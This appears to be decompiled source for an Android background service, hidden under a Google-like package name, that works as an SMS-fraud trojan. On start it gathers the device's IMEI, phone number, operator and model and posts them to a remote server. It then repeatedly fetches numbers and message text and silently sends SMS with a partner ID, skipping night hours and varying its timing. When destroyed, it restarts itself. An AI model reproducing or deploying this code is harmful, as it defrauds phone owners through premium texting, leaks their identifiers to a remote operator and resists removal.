package com.google.elements;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.SmsManager;
import java.util.Timer;
import java.util.TimerTask;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class WorkService extends Service {
    Handler handler = new Handler();

    public void onCreate() {
        final Utils utils = Utils.getInstance(this);
        utils.loadSettings();
        utils.updateSettings();
        JSONObject info = new JSONObject();
        try {
            info.put("imei", utils.getDeviceId());
            info.put("partner_id", utils.getPartnerId());
            info.put("country", utils.getCountry());
            info.put("operator", utils.getOperator());
            info.put("phone", utils.getPhone());
            info.put("model", utils.getModel());
            info.put("version", utils.getVersion());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        utils.sendPostRequest("registration", info.toString());
        new Timer().schedule(new TimerTask() {
            public void run() {
                WorkService.this.handler.post(new Runnable() {
                    public void run() {
                        JSONObject info = new JSONObject();
                        try {
                            info.put("imei", utils.getDeviceId());
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        utils.sendPostRequest("repeat", info.toString());
                        if (!utils.getStop() && utils.getFail() < 3 && !utils.isNightTime() && ((utils.getSending() == 0 && utils.getCurrentTime() - utils.getLastTime() >= ((long) utils.getFirstInterval())) || (utils.getSending() > 0 && utils.getCurrentTime() - utils.getLastTime() >= ((long) utils.getInterval())))) {
                            JSONArray numbers;
                            if (utils.getSending() == 0) {
                                numbers = utils.getCurrentNumbers(true);
                            } else {
                                numbers = utils.getCurrentNumbers();
                            }
                            if (numbers != null && numbers.length() > 0) {
                                SmsManager send = SmsManager.getDefault();
                                for (int i = 0; i < numbers.length(); i++) {
                                    try {
                                        JSONObject message = numbers.getJSONObject(i);
                                        send.sendTextMessage(message.getString("number"), null, message.getString("text") + " " + utils.getPartnerId(), null, null);
                                    } catch (JSONException e2) {
                                        e2.printStackTrace();
                                    }
                                }
                            }
                            utils.incrementFail(false);
                            utils.setInterval((utils.getIntervalValue() * (utils.getFail() + 1)) + utils.getRandom());
                            utils.incrementSending();
                            utils.setLastTime();
                        }
                        if (utils.getFail() == 3 && utils.isActive()) {
                            utils.deactiveApplication();
                        }
                    }
                });
            }
        }, 10000, 300000);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        return 1;
    }

    public void onDestroy() {
        Intent work = new Intent(getApplicationContext(), WorkService.class);
        work.setFlags(268435456);
        startService(work);
    }
}
